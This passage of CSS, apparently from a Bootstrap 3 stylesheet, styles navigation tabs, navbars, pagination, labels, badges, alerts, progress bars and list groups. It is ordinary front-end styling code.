            .nav-tabs > li {
                float: left;
                margin-bottom: -1px;
            }
            .nav-tabs > li > a {
                margin-right: 2px;
                line-height: 1.428571429;
                border: 1px solid transparent;
                border-radius: 4px 4px 0 0;
            }
            .nav-tabs > li > a:hover {
                border-color: #eeeeee #eeeeee #ddd;
            }
            .nav-tabs > li.active > a,
            .nav-tabs > li.active > a:hover,
            .nav-tabs > li.active > a:focus {
                color: #555555;
                background-color: #fff;
                border: 1px solid #ddd;
                border-bottom-color: transparent;
                cursor: default;
            }
            .nav-pills > li {
                float: left;
            }
            .nav-pills > li > a {
                border-radius: 4px;
            }
            .nav-pills > li + li {
                margin-left: 2px;
            }
            .nav-pills > li.active > a,
            .nav-pills > li.active > a:hover,
            .nav-pills > li.active > a:focus {
                color: #fff;
                background-color: #337ab7;
            }
            .nav-stacked > li {
                float: none;
            }
            .nav-stacked > li + li {
                margin-top: 2px;
                margin-left: 0;
            }
            .nav-justified,
            .nav-tabs.nav-justified {
                width: 100%;
            }
            .nav-justified > li,
            .nav-tabs.nav-justified > li {
                float: none;
            }
            .nav-justified > li > a,
            .nav-tabs.nav-justified > li > a {
                text-align: center;
                margin-bottom: 5px;
            }
            .nav-justified > .dropdown .dropdown-menu {
                top: auto;
                left: auto;
            }
            @media (min-width: 768px) {
                .nav-justified > li,
                .nav-tabs.nav-justified > li {
                    display: table-cell;
                    width: 1%;
                }
                .nav-justified > li > a,
                .nav-tabs.nav-justified > li > a {
                    margin-bottom: 0;
                }
            }
            .nav-tabs-justified,
            .nav-tabs.nav-justified {
                border-bottom: 0;
            }
            .nav-tabs-justified > li > a,
            .nav-tabs.nav-justified > li > a {
                margin-right: 0;
                border-radius: 4px;
            }
            .nav-tabs-justified > .active > a,
            .nav-tabs.nav-justified > .active > a,
            .nav-tabs-justified > .active > a:hover,
            .nav-tabs-justified > .active > a:focus {
                border: 1px solid #ddd;
            }
            @media (min-width: 768px) {
                .nav-tabs-justified > li > a,
                .nav-tabs.nav-justified > li > a {
                    border-bottom: 1px solid #ddd;
                    border-radius: 4px 4px 0 0;
                }
                .nav-tabs-justified > .active > a,
                .nav-tabs.nav-justified > .active > a,
                .nav-tabs-justified > .active > a:hover,
                .nav-tabs-justified > .active > a:focus {
                    border-bottom-color: #fff;
                }
            }
            .tab-content > .tab-pane {
                display: none;
            }
            .tab-content > .active {
                display: block;
            }
            .nav-tabs .dropdown-menu {
                margin-top: -1px;
                border-top-right-radius: 0;
                border-top-left-radius: 0;
            }
            .navbar {
                position: relative;
                min-height: 50px;
                margin-bottom: 20px;
                border: 1px solid transparent;
            }
            .navbar:before,
            .navbar:after {
                content: " ";
                display: table;
            }
            .navbar:after {
                clear: both;
            }
            @media (min-width: 768px) {
                .navbar {
                    border-radius: 4px;
                }
            }
            .navbar-header:before,
            .navbar-header:after {
                content: " ";
                display: table;
            }
            .navbar-header:after {
                clear: both;
            }
            @media (min-width: 768px) {
                .navbar-header {
                    float: left;
                }
            }
            .navbar-collapse {
                overflow-x: visible;
                padding-right: 15px;
                padding-left: 15px;
                border-top: 1px solid transparent;
                box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1);
                -webkit-overflow-scrolling: touch;
            }
            .navbar-collapse:before,
            .navbar-collapse:after {
                content: " ";
                display: table;
            }
            .navbar-collapse:after {
                clear: both;
            }
            .navbar-collapse.in {
                overflow-y: auto;
            }
            @media (min-width: 768px) {
                .navbar-collapse {
                    width: auto;
                    border-top: 0;
                    box-shadow: none;
                }
                .navbar-collapse.collapse {
                    display: block !important;
                    height: auto !important;
                    padding-bottom: 0;
                    overflow: visible !important;
                }
                .navbar-collapse.in {
                    overflow-y: visible;
                }
                .navbar-fixed-top .navbar-collapse,
                .navbar-static-top .navbar-collapse,
                .navbar-fixed-bottom .navbar-collapse {
                    padding-left: 0;
                    padding-right: 0;
                }
            }
            .navbar-fixed-top .navbar-collapse,
            .navbar-fixed-bottom .navbar-collapse {
                max-height: 340px;
            }
            @media (max-device-width: 480px) and (orientation: landscape) {
                .navbar-fixed-top .navbar-collapse,
                .navbar-fixed-bottom .navbar-collapse {
                    max-height: 200px;
                }
            }
            .container > .navbar-header,
            .container > .navbar-collapse,
            .container-fluid > .navbar-header,
            .container-fluid > .navbar-collapse {
                margin-right: -15px;
                margin-left: -15px;
            }
            @media (min-width: 768px) {
                .container > .navbar-header,
                .container > .navbar-collapse,
                .container-fluid > .navbar-header,
                .container-fluid > .navbar-collapse {
                    margin-right: 0;
                    margin-left: 0;
                }
            }
            .navbar-static-top {
                z-index: 1000;
                border-width: 0 0 1px;
            }
            @media (min-width: 768px) {
                .navbar-static-top {
                    border-radius: 0;
                }
            }
            .navbar-fixed-top,
            .navbar-fixed-bottom {
                position: fixed;
                right: 0;
                left: 0;
                z-index: 1030;
            }
            @media (min-width: 768px) {
                .navbar-fixed-top,
                .navbar-fixed-bottom {
                    border-radius: 0;
                }
            }
            .navbar-fixed-top {
                top: 0;
                border-width: 0 0 1px;
            }
            .navbar-fixed-bottom {
                bottom: 0;
                margin-bottom: 0;
                border-width: 1px 0 0;
            }
            .navbar-brand {
                float: left;
                padding: 15px 15px;
                font-size: 18px;
                line-height: 20px;
                height: 50px;
            }
            .navbar-brand:hover,
            .navbar-brand:focus {
                text-decoration: none;
            }
            .navbar-brand > img {
                display: block;
            }
            @media (min-width: 768px) {
                .navbar > .container .navbar-brand,
                .navbar > .container-fluid .navbar-brand {
                    margin-left: -15px;
                }
            }
            .navbar-toggle {
                position: relative;
                float: right;
                margin-right: 15px;
                padding: 9px 10px;
                margin-top: 8px;
                margin-bottom: 8px;
                background-color: transparent;
                background-image: none;
                border: 1px solid transparent;
                border-radius: 4px;
            }
            .navbar-toggle:focus {
                outline: 0;
            }
            .navbar-toggle .icon-bar {
                display: block;
                width: 22px;
                height: 2px;
                border-radius: 1px;
            }
            .navbar-toggle .icon-bar + .icon-bar {
                margin-top: 4px;
            }
            @media (min-width: 768px) {
                .navbar-toggle {
                    display: none;
                }
            }
            .navbar-nav {
                margin: 7.5px -15px;
            }
            .navbar-nav > li > a {
                padding-top: 10px;
                padding-bottom: 10px;
                line-height: 20px;
            }
            @media (max-width: 767px) {
                .navbar-nav .open .dropdown-menu {
                    position: static;
                    float: none;
                    width: auto;
                    margin-top: 0;
                    background-color: transparent;
                    border: 0;
                    box-shadow: none;
                }
                .navbar-nav .open .dropdown-menu > li > a,
                .navbar-nav .open .dropdown-menu .dropdown-header {
                    padding: 5px 15px 5px 25px;
                }
                .navbar-nav .open .dropdown-menu > li > a {
                    line-height: 20px;
                }
                .navbar-nav .open .dropdown-menu > li > a:hover,
                .navbar-nav .open .dropdown-menu > li > a:focus {
                    background-image: none;
                }
            }
            @media (min-width: 768px) {
                .navbar-nav {
                    float: left;
                    margin: 0;
                }
                .navbar-nav > li {
                    float: left;
                }
                .navbar-nav > li > a {
                    padding-top: 15px;
                    padding-bottom: 15px;
                }
            }
            .navbar-form {
                margin-left: -15px;
                margin-right: -15px;
                padding: 10px 15px;
                border-top: 1px solid transparent;
                border-bottom: 1px solid transparent;
                -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
                box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
                margin-top: 8px;
                margin-bottom: 8px;
            }
            @media (min-width: 768px) {
                .navbar-form .form-group {
                    display: inline-block;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .navbar-form .form-control {
                    display: inline-block;
                    width: auto;
                    vertical-align: middle;
                }
                .navbar-form .form-control-static {
                    display: inline-block;
                }
                .navbar-form .input-group {
                    display: inline-table;
                    vertical-align: middle;
                }
                .navbar-form .input-group .input-group-addon,
                .navbar-form .input-group .input-group-btn,
                .navbar-form .input-group .form-control {
                    width: auto;
                }
                .navbar-form .input-group > .form-control {
                    width: 100%;
                }
                .navbar-form .control-label {
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .navbar-form .radio,
                .navbar-form .checkbox {
                    display: inline-block;
                    margin-top: 0;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .navbar-form .radio label,
                .navbar-form .checkbox label {
                    padding-left: 0;
                }
                .navbar-form .radio input[type="radio"],
                .navbar-form .checkbox input[type="checkbox"] {
                    position: relative;
                    margin-left: 0;
                }
                .navbar-form .has-feedback .form-control-feedback {
                    top: 0;
                }
            }
            @media (max-width: 767px) {
                .navbar-form .form-group {
                    margin-bottom: 5px;
                }
                .navbar-form .form-group:last-child {
                    margin-bottom: 0;
                }
            }
            @media (min-width: 768px) {
                .navbar-form {
                    width: auto;
                    border: 0;
                    margin-left: 0;
                    margin-right: 0;
                    padding-top: 0;
                    padding-bottom: 0;
                    -webkit-box-shadow: none;
                    box-shadow: none;
                }
            }
            .navbar-nav > li > .dropdown-menu {
                margin-top: 0;
                border-top-right-radius: 0;
                border-top-left-radius: 0;
            }
            .navbar-fixed-bottom .navbar-nav > li > .dropdown-menu {
                margin-bottom: 0;
                border-top-right-radius: 4px;
                border-top-left-radius: 4px;
                border-bottom-right-radius: 0;
                border-bottom-left-radius: 0;
            }
            .navbar-btn {
                margin-top: 8px;
                margin-bottom: 8px;
            }
            .navbar-btn.btn-sm,
            .btn-group-sm > .navbar-btn.btn {
                margin-top: 10px;
                margin-bottom: 10px;
            }
            .navbar-btn.btn-xs,
            .btn-group-xs > .navbar-btn.btn {
                margin-top: 14px;
                margin-bottom: 14px;
            }
            .navbar-text {
                margin-top: 15px;
                margin-bottom: 15px;
            }
            @media (min-width: 768px) {
                .navbar-text {
                    float: left;
                    margin-left: 15px;
                    margin-right: 15px;
                }
            }
            @media (min-width: 768px) {
                .navbar-left {
                    float: left !important;
                }
                .navbar-right {
                    float: right !important;
                    margin-right: -15px;
                }
                .navbar-right ~ .navbar-right {
                    margin-right: 0;
                }
            }
            .navbar-default {
                background-color: #f8f8f8;
                border-color: #e7e7e7;
            }
            .navbar-default .navbar-brand {
                color: #777;
            }
            .navbar-default .navbar-brand:hover,
            .navbar-default .navbar-brand:focus {
                color: #5e5e5e;
                background-color: transparent;
            }
            .navbar-default .navbar-text {
                color: #777;
            }
            .navbar-default .navbar-nav > li > a {
                color: #777;
            }
            .navbar-default .navbar-nav > li > a:hover,
            .navbar-default .navbar-nav > li > a:focus {
                color: #333;
                background-color: transparent;
            }
            .navbar-default .navbar-nav > .active > a,
            .navbar-default .navbar-nav > .active > a:hover,
            .navbar-default .navbar-nav > .active > a:focus {
                color: #555;
                background-color: #e7e7e7;
            }
            .navbar-default .navbar-nav > .disabled > a,
            .navbar-default .navbar-nav > .disabled > a:hover,
            .navbar-default .navbar-nav > .disabled > a:focus {
                color: #ccc;
                background-color: transparent;
            }
            .navbar-default .navbar-toggle {
                border-color: #ddd;
            }
            .navbar-default .navbar-toggle:hover,
            .navbar-default .navbar-toggle:focus {
                background-color: #ddd;
            }
            .navbar-default .navbar-toggle .icon-bar {
                background-color: #888;
            }
            .navbar-default .navbar-collapse,
            .navbar-default .navbar-form {
                border-color: #e7e7e7;
            }
            .navbar-default .navbar-nav > .open > a,
            .navbar-default .navbar-nav > .open > a:hover,
            .navbar-default .navbar-nav > .open > a:focus {
                background-color: #e7e7e7;
                color: #555;
            }
            @media (max-width: 767px) {
                .navbar-default .navbar-nav .open .dropdown-menu > li > a {
                    color: #777;
                }
                .navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,
                .navbar-default .navbar-nav .open .dropdown-menu > li > a:focus {
                    color: #333;
                    background-color: transparent;
                }
                .navbar-default .navbar-nav .open .dropdown-menu > .active > a,
                .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,
                .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus {
                    color: #555;
                    background-color: #e7e7e7;
                }
                .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,
                .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,
                .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus {
                    color: #ccc;
                    background-color: transparent;
                }
            }
            .navbar-default .navbar-link {
                color: #777;
            }
            .navbar-default .navbar-link:hover {
                color: #333;
            }
            .navbar-default .btn-link {
                color: #777;
            }
            .navbar-default .btn-link:hover,
            .navbar-default .btn-link:focus {
                color: #333;
            }
            .navbar-default .btn-link[disabled]:hover,
            .navbar-default .btn-link[disabled]:focus,
            fieldset[disabled] .navbar-default .btn-link:hover,
            fieldset[disabled] .navbar-default .btn-link:focus {
                color: #ccc;
            }
            .navbar-inverse {
                background-color: #222;
                border-color: #090909;
            }
            .navbar-inverse .navbar-brand {
                color: #9d9d9d;
            }
            .navbar-inverse .navbar-brand:hover,
            .navbar-inverse .navbar-brand:focus {
                color: #fff;
                background-color: transparent;
            }
            .navbar-inverse .navbar-text {
                color: #9d9d9d;
            }
            .navbar-inverse .navbar-nav > li > a {
                color: #9d9d9d;
            }
            .navbar-inverse .navbar-nav > li > a:hover,
            .navbar-inverse .navbar-nav > li > a:focus {
                color: #fff;
                background-color: transparent;
            }
            .navbar-inverse .navbar-nav > .active > a,
            .navbar-inverse .navbar-nav > .active > a:hover,
            .navbar-inverse .navbar-nav > .active > a:focus {
                color: #fff;
                background-color: #090909;
            }
            .navbar-inverse .navbar-nav > .disabled > a,
            .navbar-inverse .navbar-nav > .disabled > a:hover,
            .navbar-inverse .navbar-nav > .disabled > a:focus {
                color: #444;
                background-color: transparent;
            }
            .navbar-inverse .navbar-toggle {
                border-color: #333;
            }
            .navbar-inverse .navbar-toggle:hover,
            .navbar-inverse .navbar-toggle:focus {
                background-color: #333;
            }
            .navbar-inverse .navbar-toggle .icon-bar {
                background-color: #fff;
            }
            .navbar-inverse .navbar-collapse,
            .navbar-inverse .navbar-form {
                border-color: #101010;
            }
            .navbar-inverse .navbar-nav > .open > a,
            .navbar-inverse .navbar-nav > .open > a:hover,
            .navbar-inverse .navbar-nav > .open > a:focus {
                background-color: #090909;
                color: #fff;
            }
            @media (max-width: 767px) {
                .navbar-inverse .navbar-nav .open .dropdown-menu > .dropdown-header {
                    border-color: #090909;
                }
                .navbar-inverse .navbar-nav .open .dropdown-menu .divider {
                    background-color: #090909;
                }
                .navbar-inverse .navbar-nav .open .dropdown-menu > li > a {
                    color: #9d9d9d;
                }
                .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:hover,
                .navbar-inverse .navbar-nav .open .dropdown-menu > li > a:focus {
                    color: #fff;
                    background-color: transparent;
                }
                .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a,
                .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:hover,
                .navbar-inverse .navbar-nav .open .dropdown-menu > .active > a:focus {
                    color: #fff;
                    background-color: #090909;
                }
                .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a,
                .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:hover,
                .navbar-inverse .navbar-nav .open .dropdown-menu > .disabled > a:focus {
                    color: #444;
                    background-color: transparent;
                }
            }
            .navbar-inverse .navbar-link {
                color: #9d9d9d;
            }
            .navbar-inverse .navbar-link:hover {
                color: #fff;
            }
            .navbar-inverse .btn-link {
                color: #9d9d9d;
            }
            .navbar-inverse .btn-link:hover,
            .navbar-inverse .btn-link:focus {
                color: #fff;
            }
            .navbar-inverse .btn-link[disabled]:hover,
            .navbar-inverse .btn-link[disabled]:focus,
            fieldset[disabled] .navbar-inverse .btn-link:hover,
            fieldset[disabled] .navbar-inverse .btn-link:focus {
                color: #444;
            }
            .breadcrumb {
                padding: 8px 15px;
                margin-bottom: 20px;
                list-style: none;
                background-color: #f5f5f5;
                border-radius: 4px;
            }
            .breadcrumb > li {
                display: inline-block;
            }
            .breadcrumb > li + li:before {
                content: "/ ";
                padding: 0 5px;
                color: #ccc;
            }
            .breadcrumb > .active {
                color: #777777;
            }
            .pagination {
                display: inline-block;
                padding-left: 0;
                margin: 20px 0;
                border-radius: 4px;
            }
            .pagination > li {
                display: inline;
            }
            .pagination > li > a,
            .pagination > li > span {
                position: relative;
                float: left;
                padding: 6px 12px;
                line-height: 1.428571429;
                text-decoration: none;
                color: #337ab7;
                background-color: #fff;
                border: 1px solid #ddd;
                margin-left: -1px;
            }
            .pagination > li:first-child > a,
            .pagination > li:first-child > span {
                margin-left: 0;
                border-bottom-left-radius: 4px;
                border-top-left-radius: 4px;
            }
            .pagination > li:last-child > a,
            .pagination > li:last-child > span {
                border-bottom-right-radius: 4px;
                border-top-right-radius: 4px;
            }
            .pagination > li > a:hover,
            .pagination > li > a:focus,
            .pagination > li > span:hover,
            .pagination > li > span:focus {
                z-index: 2;
                color: #23527c;
                background-color: #eeeeee;
                border-color: #ddd;
            }
            .pagination > .active > a,
            .pagination > .active > a:hover,
            .pagination > .active > a:focus,
            .pagination > .active > span,
            .pagination > .active > span:hover,
            .pagination > .active > span:focus {
                z-index: 3;
                color: #fff;
                background-color: #337ab7;
                border-color: #337ab7;
                cursor: default;
            }
            .pagination > .disabled > span,
            .pagination > .disabled > span:hover,
            .pagination > .disabled > span:focus,
            .pagination > .disabled > a,
            .pagination > .disabled > a:hover,
            .pagination > .disabled > a:focus {
                color: #777777;
                background-color: #fff;
                border-color: #ddd;
                cursor: not-allowed;
            }
            .pagination-lg > li > a,
            .pagination-lg > li > span {
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
            }
            .pagination-lg > li:first-child > a,
            .pagination-lg > li:first-child > span {
                border-bottom-left-radius: 6px;
                border-top-left-radius: 6px;
            }
            .pagination-lg > li:last-child > a,
            .pagination-lg > li:last-child > span {
                border-bottom-right-radius: 6px;
                border-top-right-radius: 6px;
            }
            .pagination-sm > li > a,
            .pagination-sm > li > span {
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
            }
            .pagination-sm > li:first-child > a,
            .pagination-sm > li:first-child > span {
                border-bottom-left-radius: 3px;
                border-top-left-radius: 3px;
            }
            .pagination-sm > li:last-child > a,
            .pagination-sm > li:last-child > span {
                border-bottom-right-radius: 3px;
                border-top-right-radius: 3px;
            }
            .pager {
                padding-left: 0;
                margin: 20px 0;
                list-style: none;
                text-align: center;
            }
            .pager:before,
            .pager:after {
                content: " ";
                display: table;
            }
            .pager:after {
                clear: both;
            }
            .pager li {
                display: inline;
            }
            .pager li > a,
            .pager li > span {
                display: inline-block;
                padding: 5px 14px;
                background-color: #fff;
                border: 1px solid #ddd;
                border-radius: 15px;
            }
            .pager li > a:hover,
            .pager li > a:focus {
                text-decoration: none;
                background-color: #eeeeee;
            }
            .pager .next > a,
            .pager .next > span {
                float: right;
            }
            .pager .previous > a,
            .pager .previous > span {
                float: left;
            }
            .pager .disabled > a,
            .pager .disabled > a:hover,
            .pager .disabled > a:focus,
            .pager .disabled > span {
                color: #777777;
                background-color: #fff;
                cursor: not-allowed;
            }
            .label {
                display: inline;
                padding: 0.2em 0.6em 0.3em;
                font-size: 75%;
                font-weight: bold;
                line-height: 1;
                color: #fff;
                text-align: center;
                white-space: nowrap;
                vertical-align: baseline;
                border-radius: 0.25em;
            }
            .label:empty {
                display: none;
            }
            .btn .label {
                position: relative;
                top: -1px;
            }
            a.label:hover,
            a.label:focus {
                color: #fff;
                text-decoration: none;
                cursor: pointer;
            }
            .label-default {
                background-color: #777777;
            }
            .label-default[href]:hover,
            .label-default[href]:focus {
                background-color: #5e5e5e;
            }
            .label-primary {
                background-color: #337ab7;
            }
            .label-primary[href]:hover,
            .label-primary[href]:focus {
                background-color: #286090;
            }
            .label-success {
                background-color: #5cb85c;
            }
            .label-success[href]:hover,
            .label-success[href]:focus {
                background-color: #449d44;
            }
            .label-info {
                background-color: #5bc0de;
            }
            .label-info[href]:hover,
            .label-info[href]:focus {
                background-color: #31b0d5;
            }
            .label-warning {
                background-color: #f0ad4e;
            }
            .label-warning[href]:hover,
            .label-warning[href]:focus {
                background-color: #ec971f;
            }
            .label-danger {
                background-color: #d9534f;
            }
            .label-danger[href]:hover,
            .label-danger[href]:focus {
                background-color: #c9302c;
            }
            .badge {
                display: inline-block;
                min-width: 10px;
                padding: 3px 7px;
                font-size: 12px;
                font-weight: bold;
                color: #fff;
                line-height: 1;
                vertical-align: middle;
                white-space: nowrap;
                text-align: center;
                background-color: #777777;
                border-radius: 10px;
            }
            .badge:empty {
                display: none;
            }
            .btn .badge {
                position: relative;
                top: -1px;
            }
            .btn-xs .badge,
            .btn-group-xs > .btn .badge {
                top: 0;
                padding: 1px 5px;
            }
            .list-group-item.active > .badge,
            .nav-pills > .active > a > .badge {
                color: #337ab7;
                background-color: #fff;
            }
            .list-group-item > .badge {
                float: right;
            }
            .list-group-item > .badge + .badge {
                margin-right: 5px;
            }
            .nav-pills > li > a > .badge {
                margin-left: 3px;
            }
            a.badge:hover,
            a.badge:focus {
                color: #fff;
                text-decoration: none;
                cursor: pointer;
            }
            .jumbotron {
                padding-top: 30px;
                padding-bottom: 30px;
                margin-bottom: 30px;
                color: inherit;
                background-color: #eeeeee;
            }
            .jumbotron h1,
            .jumbotron .h1 {
                color: inherit;
            }
            .jumbotron p {
                margin-bottom: 15px;
                font-size: 21px;
                font-weight: 200;
            }
            .jumbotron > hr {
                border-top-color: #d5d5d5;
            }
            .container .jumbotron,
            .container-fluid .jumbotron {
                border-radius: 6px;
                padding-left: 15px;
                padding-right: 15px;
            }
            .jumbotron .container {
                max-width: 100%;
            }
            @media screen and (min-width: 768px) {
                .jumbotron {
                    padding-top: 48px;
                    padding-bottom: 48px;
                }
                .container .jumbotron,
                .container-fluid .jumbotron {
                    padding-left: 60px;
                    padding-right: 60px;
                }
                .jumbotron h1,
                .jumbotron .h1 {
                    font-size: 63px;
                }
            }
            .thumbnail {
                display: block;
                padding: 4px;
                margin-bottom: 20px;
                line-height: 1.428571429;
                background-color: #fff;
                border: 1px solid #ddd;
                border-radius: 4px;
                -webkit-transition: border 0.2s ease-in-out;
                -o-transition: border 0.2s ease-in-out;
                transition: border 0.2s ease-in-out;
            }
            .thumbnail > img,
            .thumbnail a > img {
                display: block;
                max-width: 100%;
                height: auto;
                margin-left: auto;
                margin-right: auto;
            }
            .thumbnail .caption {
                padding: 9px;
                color: #333333;
            }
            a.thumbnail:hover,
            a.thumbnail:focus,
            a.thumbnail.active {
                border-color: #337ab7;
            }
            .alert {
                padding: 15px;
                margin-bottom: 20px;
                border: 1px solid transparent;
                border-radius: 4px;
            }
            .alert h4 {
                margin-top: 0;
                color: inherit;
            }
            .alert .alert-link {
                font-weight: bold;
            }
            .alert > p,
            .alert > ul {
                margin-bottom: 0;
            }
            .alert > p + p {
                margin-top: 5px;
            }
            .alert-dismissable,
            .alert-dismissible {
                padding-right: 35px;
            }
            .alert-dismissable .close,
            .alert-dismissible .close {
                position: relative;
                top: -2px;
                right: -21px;
                color: inherit;
            }
            .alert-success {
                background-color: #dff0d8;
                border-color: #d6e9c6;
                color: #3c763d;
            }
            .alert-success hr {
                border-top-color: #c9e2b3;
            }
            .alert-success .alert-link {
                color: #2b542c;
            }
            .alert-info {
                background-color: #d9edf7;
                border-color: #bce8f1;
                color: #31708f;
            }
            .alert-info hr {
                border-top-color: #a6e1ec;
            }
            .alert-info .alert-link {
                color: #245269;
            }
            .alert-warning {
                background-color: #fcf8e3;
                border-color: #faebcc;
                color: #8a6d3b;
            }
            .alert-warning hr {
                border-top-color: #f7e1b5;
            }
            .alert-warning .alert-link {
                color: #66512c;
            }
            .alert-danger {
                background-color: #f2dede;
                border-color: #ebccd1;
                color: #a94442;
            }
            .alert-danger hr {
                border-top-color: #e4b9c0;
            }
            .alert-danger .alert-link {
                color: #843534;
            }
            @-webkit-keyframes progress-bar-stripes {
                from {
                    background-position: 40px 0;
                }
                to {
                    background-position: 0 0;
                }
            }
            @keyframes progress-bar-stripes {
                from {
                    background-position: 40px 0;
                }
                to {
                    background-position: 0 0;
                }
            }
            .progress {
                overflow: hidden;
                height: 20px;
                margin-bottom: 20px;
                background-color: #f5f5f5;
                border-radius: 4px;
                -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
                box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
            }
            .progress-bar {
                float: left;
                width: 0%;
                height: 100%;
                font-size: 12px;
                line-height: 20px;
                color: #fff;
                text-align: center;
                background-color: #337ab7;
                -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
                box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
                -webkit-transition: width 0.6s ease;
                -o-transition: width 0.6s ease;
                transition: width 0.6s ease;
            }
            .progress-striped .progress-bar,
            .progress-bar-striped {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-size: 40px 40px;
            }
            .progress.active .progress-bar,
            .progress-bar.active {
                -webkit-animation: progress-bar-stripes 2s linear infinite;
                -o-animation: progress-bar-stripes 2s linear infinite;
                animation: progress-bar-stripes 2s linear infinite;
            }
            .progress-bar-success {
                background-color: #5cb85c;
            }
            .progress-striped .progress-bar-success {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            }
            .progress-bar-info {
                background-color: #5bc0de;
            }
            .progress-striped .progress-bar-info {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            }
            .progress-bar-warning {
                background-color: #f0ad4e;
            }
            .progress-striped .progress-bar-warning {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            }
            .progress-bar-danger {
                background-color: #d9534f;
            }
            .progress-striped .progress-bar-danger {
                background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
                background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            }
            .media {
                margin-top: 15px;
            }
            .media:first-child {
                margin-top: 0;
            }
            .media,
            .media-body {
                zoom: 1;
                overflow: hidden;
            }
            .media-body {
                width: 10000px;
            }
            .media-object {
                display: block;
            }
            .media-object.img-thumbnail {
                max-width: none;
            }
            .media-right,
            .media > .pull-right {
                padding-left: 10px;
            }
            .media-left,
            .media > .pull-left {
                padding-right: 10px;
            }
            .media-left,
            .media-right,
            .media-body {
                display: table-cell;
                vertical-align: top;
            }
            .media-middle {
                vertical-align: middle;
            }
            .media-bottom {
                vertical-align: bottom;
            }
            .media-heading {
                margin-top: 0;
                margin-bottom: 5px;
            }
            .media-list {
                padding-left: 0;
                list-style: none;
            }
            .list-group {
                margin-bottom: 20px;
                padding-left: 0;
            }
            .list-group-item {
                position: relative;
                display: block;
                padding: 10px 15px;
                margin-bottom: -1px;
                background-color: #fff;
                border: 1px solid #ddd;
            }
            .list-group-item:first-child {
                border-top-right-radius: 4px;
                border-top-left-radius: 4px;
            }
            .list-group-item:last-child {
                margin-bottom: 0;
                border-bottom-right-radius: 4px;
                border-bottom-left-radius: 4px;
            }
            a.list-group-item,
            button.list-group-item {
                color: #555;
            }
            a.list-group-item .list-group-item-heading,
            button.list-group-item .list-group-item-heading {
                color: #333;
            }
            a.list-group-item:hover,
